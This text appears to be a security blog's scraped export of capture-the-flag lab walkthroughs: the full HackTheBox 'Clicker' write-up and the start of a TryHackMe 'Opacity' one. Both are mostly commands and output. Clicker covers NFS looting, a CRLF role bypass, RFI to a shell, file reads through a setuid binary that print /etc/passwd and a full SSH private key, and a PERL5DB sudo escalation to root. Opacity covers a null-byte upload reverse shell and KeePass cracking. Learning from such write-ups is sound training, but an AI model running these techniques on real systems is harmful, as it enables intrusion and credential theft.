&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#CRLF&nbsp;&nbsp;#NFS&nbsp;&nbsp;#RFI&nbsp;&nbsp;#perl&nbsp;&nbsp;#putty_gen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Description â¤µï¸This machine from HackTheBox , is categorized as Medium Level Machine . It focuses into NFS shares , I learned about perl and about web part alot from this machine.## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.232Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-18 19:35 ISTNmap scan report for 10.10.11.232Host is up (0.16s latency).Not shown: 65526 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)|_ 256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)80/tcp open http Apache httpd 2.4.52 ((Ubuntu))|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://clicker.htb/111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 36832/udp mountd| 100005 1,2,3 41569/tcp mountd| 100005 1,2,3 43997/udp6 mountd| 100005 1,2,3 51525/tcp6 mountd| 100021 1,3,4 36385/tcp nlockmgr| 100021 1,3,4 38954/udp6 nlockmgr| 100021 1,3,4 43017/tcp6 nlockmgr| 100021 1,3,4 54393/udp nlockmgr| 100024 1 34209/udp6 status| 100024 1 41235/tcp6 status| 100024 1 42573/tcp status| 100024 1 60124/udp status| 100227 3 2049/tcp nfs_acl|_ 100227 3 2049/tcp6 nfs_acl2049/tcp open nfs_acl 3 (RPC #100227)36385/tcp open nlockmgr 1-4 (RPC #100021)41569/tcp open mountd 1-3 (RPC #100005)42573/tcp open status 1 (RPC #100024)55593/tcp open mountd 1-3 (RPC #100005)57471/tcp open mountd 1-3 (RPC #100005)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## NSF Enumeration â¤µï¸Firstly I enumerated the NFS shares through `showmount` command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ showmount -e 10.10.11.232Export list for 10.10.11.232:/mnt/backups *```{: .nolineno}Now I have to make a directory for accessing NFS Shares â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ mkdir /tmp/nfsmkdir: cannot create directory â€˜/tmp/nfsâ€™: File exists â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 10.10.11.232:/mnt/backups /tmp/nfs[sudo] password for kali: mount.nfs: timeout set for Sat Nov 18 19:39:48 2023mount.nfs: trying text-based options 'vers=3,proto=tcp,nolock,addr=10.10.11.232'mount.nfs: prog 100003, trying vers=3, prot=6mount.nfs: trying 10.10.11.232 prog 100003 vers 3 prot TCP port 2049mount.nfs: prog 100005, trying vers=3, prot=6mount.nfs: trying 10.10.11.232 prog 100005 vers 3 prot TCP port 41569â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ ls -al /tmp/nfs total 2240drwxr-xr-x 2 nobody nogroup 4096 Sep 6 00:49 .drwxrwxrwt 18 root root 4096 Nov 18 19:36 ..-rw-r--r-- 1 root root 2284115 Sep 2 01:57 clicker.htb_backup.zip```{: .nolineno}Now lets transfer that into the Attackers machine â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ cp /tmp/nfs/clicker.htb_backup.zip . â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ mkdir clicker_backup_zip â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ cd clicker_backup_zip â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker/clicker_backup_zip]â””â”€$ unzip ../clicker.htb_backup.zip Archive: ../clicker.htb_backup.zip creating: clicker.htb/ inflating: clicker.htb/play.php inflating: clicker.htb/profile.php inflating: clicker.htb/authenticate.php......â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker/clicker_backup_zip]â””â”€$ cd clicker.htb â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Clicker/clicker_backup_zip/clicker.htb]â””â”€$ ls -al total 72drwxr-xr-x 4 kali kali 4096 Sep 2 01:51 .drwxr-xr-x 3 kali kali 4096 Nov 18 19:39 ..-rw-rw-r-- 1 kali kali 3934 Sep 2 01:48 admin.phpdrwxr-xr-x 4 kali kali 4096 Feb 28 2023 assets-rw-rw-r-- 1 kali kali 608 Sep 2 01:47 authenticate.php-rw-rw-r-- 1 kali kali 541 Sep 2 01:47 create_player.php-rw-rw-r-- 1 kali kali 2536 Sep 2 01:48 db_utils.php-rw-r--r-- 1 kali kali 1376 Sep 2 01:48 diagnostic.php-rw-rw-r-- 1 kali kali 1977 Sep 2 01:48 export.phpdrwxr-xr-x 2 kali kali 4096 Sep 2 01:48 exports-rw-rw-r-- 1 kali kali 3887 Sep 2 01:48 index.php-rw-rw-r-- 1 kali kali 3423 Sep 2 01:48 info.php-rw-rw-r-- 1 kali kali 3301 Sep 2 01:48 login.php-rw-rw-r-- 1 kali kali 74 Sep 2 01:47 logout.php-rw-rw-r-- 1 kali kali 3341 Sep 2 01:47 play.php-rw-rw-r-- 1 kali kali 3070 Sep 2 01:47 profile.php-rw-rw-r-- 1 kali kali 3333 Sep 2 01:48 register.php-rw-rw-r-- 1 kali kali 563 Sep 2 01:48 save_game.php```{: .nolineno}Now I have a domain name to lets set the /etc/hosts file as `clicker.htb` and lets enumerate the web part .## Web Enumeration â¤µï¸Lets see the webpage first :![Untitled](Clicker/Untitled%201.png)Lets register a user first *`shiva : shiva` â†’*![Untitled](Clicker/Untitled%202.png)After Login into the site I got 2 options â†’![Untitled](Clicker/Untitled%203.png)I checked the option Play and got 2 parameters as `click` and `level` while interceting with burpsuite â†’![Untitled](Clicker/Untitled%204.png)And as I also got those php source code files from NFS share so Lets check the source code what it is for and what else can be done to escalate the privileges from normal user to Admin user â†’```phpâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Clicker/clicker_backup_zip/clicker.htb]â””â”€$ cat play.php Clicker - The Game Clicks: 0 Level: 0 0 - LevelUP cost: 15 Save and close ```{: .nolineno}In the starting of the session `ROLE` variable is required so after some enumeration I got to know from `authenticate.php` file that the `ROLE` signifies the profile or designation â†’```phpâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/HTB/Clicker/clicker_backup_zip/clicker.htb]â””â”€$ cat authenticate.php ```{: .nolineno}so lets try to provide the `role` value as Admin so that the user shiva can be authenticated as Admin user â†’![Untitled](Clicker/Untitled%205.png)It gives an error as `Malicious activity detected!` and After trying so many things I used the [**CRLF (%0D%0A) Injection**](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a) to invade this error and bypass this Error Detection â†’![Untitled](Clicker/Untitled%206.png)After Forwording the request I received Success message â†’![Untitled](Clicker/Untitled%207.png)Now I Logged out of the site and relogin as same user and Now I have Adminstrator privileges â†’![Untitled](Clicker/Untitled%208.png)Lets see the Content of `Adminstration` â†’![Untitled](Clicker/Untitled%209.png)I have 3 Keys and its values Nickname , Click , and Level and I have the option to export the file in a format so lets include the RFI payload in a nickname and Export that document in php format â†’![Untitled](Clicker/Untitled%2010.png)It was successfully responded , Now I have to export in php format and then I will be tring `RFI (Remote File Inclusion)` method in it â†’![Untitled](Clicker/Untitled%2011.png)Now I got this URL **`exports/File_name.php`** I will be tring RFI on it **â†’**![Untitled](Clicker/Untitled%2012.png)Now I can have a shell here â†’![Untitled](Clicker/Untitled%2013.png)In response to that I have a shell â†’```bashwww-data@clicker:/var/www/clicker.htb/exports$ whoamiwww-datawww-data@clicker:/var/www/clicker.htb/exports$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@clicker:/var/www/clicker.htb/exports$ cd /homewww-data@clicker:/home$ lsjackwww-data@clicker:/home$ cd jackbash: cd: jack: Permission deniedwww-data@clicker:/home$ cd /optwww-data@clicker:/opt$ lsmanage\tmonitor.shwww-data@clicker:/opt$ www-data@clicker:/opt$ cd managewww-data@clicker:/opt/manage$ ls -altotal 28drwxr-xr-x 2 jack jack 4096 Jul 21 22:29 .drwxr-xr-x 3 root root 4096 Jul 20 10:00 ..-rw-rw-r-- 1 jack jack 256 Jul 21 22:29 README.txt-rwsrwsr-x 1 jack jack 16368 Feb 26 2023 execute_querywww-data@clicker:/opt/manage$```{: .nolineno}this file `execute_query` is a binary executable file so lets see what is does according to `README.txt` file it does these workes â†’```bashwww-data@clicker:/opt/manage$ cat README.txt Web application ManagementUse the binary to execute the following task:\t- 1: Creates the database structure and adds user admin\t- 2: Creates fake players (better not tell anyone)\t- 3: Resets the admin password\t- 4: Deletes all users except the adminwww-data@clicker:/opt/manage$```{: .nolineno}Through Inspection It does these workes â†’![Untitled](Clicker/Untitled%2014.png)The values denotes the options that will work upon it â†’so option 5 is `File not readable or not found` that indicated that it will be accessing documents so lets access some information like private keys and /etc/passwd values through this â†’```bashwww-data@clicker:/opt/manage$ ./execute_query 5 ../../../etc/passwdmysql: [Warning] Using a password on the command line interface can be insecure.--------------root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:104::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinpollinate:x:105:1::/var/cache/pollinate:/bin/falsesshd:x:106:65534::/run/sshd:/usr/sbin/nologinsyslog:x:107:113::/home/syslog:/usr/sbin/nologinuuidd:x:108:114::/run/uuidd:/usr/sbin/nologintcpdump:x:109:115::/nonexistent:/usr/sbin/nologintss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/falselandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologinfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologinusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinjack:x:1000:1000:jack:/home/jack:/bin/bashlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologinstatd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin_laurel:x:998:998::/var/log/laurel:/bin/false--------------ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin' at line 1www-data@clicker:/opt/manage$```{: .nolineno}Now the private key value â†’```bashwww-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsamysql: [Warning] Using a password on the command line interface can be insecure.-------------------BEGIN OPENSSH PRIVATE KEY---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-----END OPENSSH PRIVATE KEY-----------------ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1www-data@clicker:/opt/manage$```{: .nolineno}Now I copied the Private key to my Attackers machine but it is not in format of `id_rsa` so I compared it with my own Private key and corrected the format there .But still I got this error â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ ssh -i id_rsa jack@10.10.11.232Load key \"id_rsa\": error in libcryptojack@10.10.11.232's password:```{: .nolineno}So I researched on web related to this error resolve and I found a command that will convert the format in its asking format like this â†’I was getting error when my format of id_rsa was not resolved â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ sudo puttygen id_rsa -O private-openssh -o id_rsa.convputtygen: error loading `id_rsa': file does not begin with OpenSSH new-style key header```{: .nolineno}After correction in my format I rerun the command and it worked and I got this `id_rsa.conv` private key I set the permissions as `chmod 600 id_rsa.conv` after that â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Clicker]â””â”€$ sudo puttygen id_rsa -O private-openssh -o id_rsa.conv```{: .nolineno}## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads/HTB/Clicker]â””â”€# ssh -i id_rsa.conv jack@10.10.11.232The authenticity of host '10.10.11.232 (10.10.11.232)' can not be established.ED25519 key fingerprint is SHA256:OAOlD4te1rIAd/MBDNbXq9MuDWSFoc6Jc3eaBCC5u7o.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.232' (ED25519) to the list of known hosts.Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Nov 20 08:45:20 AM UTC 2023 System load: 0.0 Usage of /: 53.5% of 5.77GB Memory usage: 16% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for eth0: 10.10.11.232 IPv6 address for eth0: dead:beef::250:56ff:feb9:4cf4Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateTo run a command as administrator (user \"root\"), use \"sudo \".See \"man sudo_root\" for details.jack@clicker:~$```{: .nolineno}Now I have a proper shell so lets dig deeper â†’```bashjack@clicker:/$ sudo -lMatching Defaults entries for jack on clicker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser jack may run the following commands on clicker: (root) SETENV: NOPASSWD: /opt/monitor.shjack@clicker:/$```{: .nolineno}I found that this file `/opt/monitor.sh` is using `/usr/bin/xml_pp` command and this command basically works though perl â†’```bashjack@clicker:/$ cat /opt/monitor.sh #!/bin/bashif [ \"$EUID\" -ne 0 ] then echo \"Error, please run as root\" exitfiset PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binunset PERL5LIB;unset PERLLIB;data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);/usr/bin/xml_pp /root/diagnostic_files/diagnostic_${timestamp}.xmlfijack@clicker:/$```{: .nolineno}This `/usr/bin/xml_pp` command is using `perl` language and after some recon I got the exploit for escalating the privileges to root â†’```perljack@clicker:/$ cat /usr/bin/xml_pp#!/usr/bin/perl -w# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu $use strict;use XML::Twig;use File::Temp qw/tempfile/;use File::Basename qw/dirname/;my @styles= XML::Twig->_pretty_print_styles; # from XML::Twigmy $styles= join '|', @styles; # for usagemy %styles= map { $_ => 1} @styles; # to check optionmy $DEFAULT_STYLE= 'indented';my $USAGE= \"usage: $0 [-v] [-i] [-s ($styles)] [-p ] [-e ] [-l] [-f ] []\";# because of the -i.bak option I don't think I can use one of the core# option processing modules, so it's custom handling and no clusterization :--(......```{: .nolineno}I used this exploit `perl_startup` that exploit works on `Perl injection vulnerability` â†’[https://www.exploit-db.com/exploits/39702](https://www.exploit-db.com/exploits/39702)```bashjack@clicker:/$ ls -al /bin/bash-rwxr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bashjack@clicker:/$ sudo PERL5OPT=-d PERL5DB='exec \"chmod u+s /bin/bash\"' /opt/monitor.shStatement unlikely to be reached at /usr/bin/xml_pp line 9.\t(Maybe you meant system() when you said exec()?)jack@clicker:/$ ls -al /bin/bash-rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bashjack@clicker:/$ /bin/bash -pbash-5.1# whoamirootbash-5.1# iduid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)bash-5.1# cd /rootbash-5.1# ls -altotal 40drwx------ 7 root root 4096 Sep 6 12:40 .drwxr-xr-x 18 root root 4096 Sep 5 19:19 ..lrwxrwxrwx 1 root root 9 Sep 5 18:46 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 2 root root 4096 Feb 25 2023 .cachedrwxr-xr-x 2 root root 4096 Nov 20 09:16 diagnostic_filesdrwxr-xr-x 3 root root 4096 Feb 25 2023 .locallrwxrwxrwx 1 root root 9 Sep 6 12:30 .mysql_history -> /dev/null-rw-r--r-- 1 root root 193 Feb 27 2023 .profiledrwxr-xr-x 2 root root 4096 Sep 5 19:19 restore-rw-r----- 1 root root 33 Nov 19 23:11 root.txtdrwx------ 2 root root 4096 Sep 6 12:36 .sshbash-5.1# cat root.txtac684e5dab6e8838569f079935515914bash-5.1#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Opacity", "url": "/posts/Opacity/", "categories": "TryHackMe", "tags": "File Upload, Password Bruteforce, PrivEsc, Keepass", "date": "2023-11-17 00:00:00 +0530", "snippet": "TryHackMe Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#File Upload&nbsp;&nbsp;#Password Bruteforce&nbsp;&...", "content": "TryHackMe Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#File Upload&nbsp;&nbsp;#Password Bruteforce&nbsp;&nbsp;#keepass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.115.151Nmap scan report for 10.10.115.151Host is up (0.17s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)| 256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)|_ 256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-title: Login|_Requested resource was login.php|_http-server-header: Apache/2.4.41 (Ubuntu)139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time: | date: 2023-11-17T08:59:49|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: OPACITY, NetBIOS user: , NetBIOS MAC: (unknown)```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 and found a login page â†’![Untitled](Opacity/Untitled%201.png)While Enumeration I found a directory called `/cloud` and that contains an image uploading page that will be helpfull to upload my RFI (Remote File Inclusion) Payload .![Untitled](Opacity/Untitled%202.png)Now I uploaded the reverse shell file through null byte injection in my reverse shell file `#00` from `shell.php` to `shell.php#00.png` that will make a image file for the file uploader functionality and the #00 will nullified the input after that so it will be forworded as shell.php as a output and I got as a result a reverse shell â†’![Untitled](Opacity/Untitled%203.png)Now I forworded all the requests and at last loaded this URL :`http://10.10.33.169/cloud/storage.php`![Untitled](Opacity/Untitled%204.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.33.169] 37706Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 09:57:56 up 6 min, 0 users, load average: 0.09, 1.10, 0.71USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can not access tty; job control turned off$ whoamiwww-data$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$```{: .nolineno}while enumeration I got a file named as dataset.kdbx and I transfered that file to attackers machine â†’```bashwww-data@opacity:/opt$ ls -altotal 12drwxr-xr-x 2 root root 4096 Jul 26 2022 .drwxr-xr-x 19 root root 4096 Jul 26 2022 ..-rwxrwxr-x 1 sysadmin sysadmin 1566 Jul 8 2022 dataset.kdbxwww-data@opacity:/opt$```{: .nolineno}Now I used `JohnTheRipper` Tool to crack its password so that I can open it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ file dataset.kdbx dataset.kdbx: Keepass password database 2.x KDBX â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ keepass2john dataset.kdbx > hashes.txt â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Opacity]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --fork=4Created directory: /home/kali/.johnUsing default input encoding: UTF-8Loaded 1 password hash (KeePass [SHA256 AES 32/64])Cost 1 (iteration count) is 100000 for all loaded hashesCost 2 (version) is 2 for all loaded hashesCost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashesNode numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for status741852963 (dataset) 1 1g 0:00:00:19 DONE (2023-11-17 15:42) 0.05081g/s 11.07p/s 11.07c/s 11.07C/s 741852963```{: .nolineno}Now Lets open this file in `Keepass2` Application â†’![Untitled](Opacity/Untitled%205.png)I got the password through `Copy Passowrd` option â†’![Untitled](Opacity/Untitled%206.png)Lets Login as sysadmimn with its password â†’```bashwww-data@opacity:/opt$ su sysadminPassword: sysadmin@opacity:/opt$ whoamisysadminsysadmin@opacity:/opt$ iduid=1000(sysadmin) gid=1000(sysadmin) 